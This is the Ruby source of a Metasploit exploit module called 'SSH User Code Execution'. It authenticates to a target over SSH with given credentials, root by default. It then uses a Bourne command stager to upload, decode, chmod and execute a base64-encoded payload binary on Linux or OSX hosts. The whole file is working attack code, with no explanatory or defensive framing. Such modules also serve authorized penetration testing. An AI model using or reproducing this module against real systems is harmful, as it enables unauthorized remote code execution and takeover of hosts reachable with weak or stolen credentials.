require 'msf/core'
require 'net/ssh'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking
 
  include Msf::Exploit::CmdStagerBourne
 
  attr_accessor :ssh_socket
 
  def initialize
    super(
      'Name'        => 'SSH User Code Execution',
      'Description' => %q{
        This module utilizes a stager to upload a base64 encoded
        binary which is then decoded, chmod'ed and executed from
        the command shell.
      },
      'Author'      => ['Spencer McIntyre', 'Brandon Knight'],
      'References'  =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'     => MSF_LICENSE,
      'Privileged'  => true,
      'DefaultOptions' =>
        {
          'PrependFork' => 'true',
          'EXITFUNC' => 'process'
        },
      'Payload'     =>
        {
          'Space'    => 4096,
          'BadChars' => "",
          'DisableNops' => true
        },
      'Platform'    => [ 'osx', 'linux' ],
      'Targets'     =>
        [
          [ 'Linux x86',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'linux'
            },
          ],
          [ 'Linux x64',
            {
              'Arch' => ARCH_X86_64,
              'Platform' => 'linux'
            },
          ],
          [ 'OSX x86',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'osx'
            },
          ],
        ],
      'DefaultTarget'  => 0,
      # For the CVE
      'DisclosureDate' => 'Jan 01 1999'
    )
 
    register_options(
      [
        OptString.new('USERNAME', [ true, "The user to authenticate as.", 'root' ]),
        OptString.new('PASSWORD', [ true, "The password to authenticate with.", '' ]),
        OptString.new('RHOST', [ true, "The target address" ]),
        Opt::RPORT(22)
      ], self.class
    )
 
    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false])
      ]
    )
  end
 
  def execute_command(cmd, opts = {})
    begin
      Timeout.timeout(3) do
        self.ssh_socket.exec!("#{cmd}\n")
      end
    rescue ::Exception
    end
  end
 
  def do_login(ip, user, pass, port)
    opt_hash = {
      :auth_methods  => ['password', 'keyboard-interactive'],
      :msframework   => framework,
      :msfmodule     => self,
      :port          => port,
      :disable_agent => true,
      :password      => pass
    }
 
    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
 
    begin
      self.ssh_socket = Net::SSH.start(ip, user, opt_hash)
    rescue Rex::ConnectionError, Rex::AddressInUse
      fail_with(Exploit::Failure::Unreachable, 'Disconnected during negotiation')
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Exploit::Failure::Disconnected, 'Timed out during negotiation')
    rescue Net::SSH::AuthenticationFailed
      fail_with(Exploit::Failure::NoAccess, 'Failed authentication')
    rescue Net::SSH::Exception => e
      fail_with(Exploit::Failure::Unknown, "SSH Error: #{e.class} : #{e.message}")
    end
 
    if not self.ssh_socket
      fail_with(Exploit::Failure::Unknown)
    end
    return
  end
 
  def exploit
    do_login(datastore['RHOST'], datastore['USERNAME'], datastore['PASSWORD'], datastore['RPORT'])
 
    print_status("#{datastore['RHOST']}:#{datastore['RPORT']} - Sending Bourne stager...")
    execute_cmdstager({:linemax => 500})
  end
end
